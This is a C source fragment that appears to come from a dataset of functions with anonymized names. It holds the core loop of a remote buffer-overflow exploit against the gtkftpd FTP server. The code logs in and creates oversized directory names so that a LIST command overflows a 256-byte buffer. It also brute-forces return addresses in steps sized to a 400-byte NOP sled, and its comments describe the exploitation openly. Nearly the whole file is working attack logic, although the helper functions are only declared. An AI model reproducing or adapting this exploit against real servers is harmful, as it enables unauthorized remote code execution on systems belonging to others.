#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */

/* Variables and functions */
 int attempts ; 
 unsigned int baseaddr ; 
 int /*<<< orphan*/  basedir ; 
 int /*<<< orphan*/  FUNC0 (int) ; 
 int /*<<< orphan*/  FUNC1 (int) ; 
 int /*<<< orphan*/  FUNC2 (int,char*,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC3 (int) ; 
 int /*<<< orphan*/  FUNC4 () ; 
 int /*<<< orphan*/  FUNC5 () ; 
 int /*<<< orphan*/  FUNC6 (unsigned int) ; 
 int /*<<< orphan*/  FUNC7 (int,unsigned int) ; 
 int /*<<< orphan*/  pass ; 
 int /*<<< orphan*/  FUNC8 (char*) ; 
 scalar_t__ reverse ; 
 int /*<<< orphan*/  FUNC9 (int) ; 
 int /*<<< orphan*/  user ; 
 int /*<<< orphan*/  writedir ; 

void FUNC10(int sock){
 unsigned int offset=0;
 FUNC3(sock); /* get the banner. */
 FUNC2(sock,"USER %s\r\n",user);
 FUNC3(sock);
 FUNC2(sock,"PASS %s\r\n",pass);
 FUNC3(sock);
 FUNC2(sock,"CWD %s\r\n",writedir);
 FUNC3(sock);
 basedir=FUNC4(); /* tmp dir of our own to use. */
 FUNC2(sock,"MKD %s\r\n",basedir);
 FUNC3(sock);
 FUNC2(sock,"CWD %s\r\n",basedir);
 FUNC3(sock);
 while(offset<(attempts*400)){ /* if it hasn't yet, it's not going to. */
  /* slight null-byte/CR check, only needs to check the last byte. */
  if((!reverse&&!((baseaddr-offset)&0xff))||(reverse&&!((baseaddr+offset)
  &0xff))||(!reverse&&((baseaddr-offset)&0xff)=='\n')||(reverse&&
  ((baseaddr+offset)&0xff)=='\n')){
   FUNC8("[!] brute address contains null-byte/CR, increasing offset "
   "by one byte.\n");
   offset++; /* one byte off if reversed won't hurt here. (401) */
  }
  /* make the evil oversized directory. (255 or less bytes) */
  FUNC2(sock,"MKD %s\r\n",FUNC6(offset));
  FUNC3(sock);
  /* date+directory exceeds 256 byte buffer, the exploit. */
  FUNC9(1); /* delay insurance. */
  FUNC2(sock,"LIST -%s\r\n",FUNC5());
  /* nothing to read here, and gtkftpd processes (the exploit) */
  /* before the ftp list connection is made, making it */
  /* pointless to view the list. */
  FUNC9(1); /* delay insurance, again, just to be sure. */
  /* delete directory, multiples will cause failure(s). */
  FUNC2(sock,"RMD %s\r\n",FUNC6(offset));
  FUNC3(sock);
  FUNC7(sock,offset);
  offset+=400; /* always at least 400 nops in a row, in shellcode. */
 }
 FUNC1(sock);
 FUNC0(sock);
 return;
}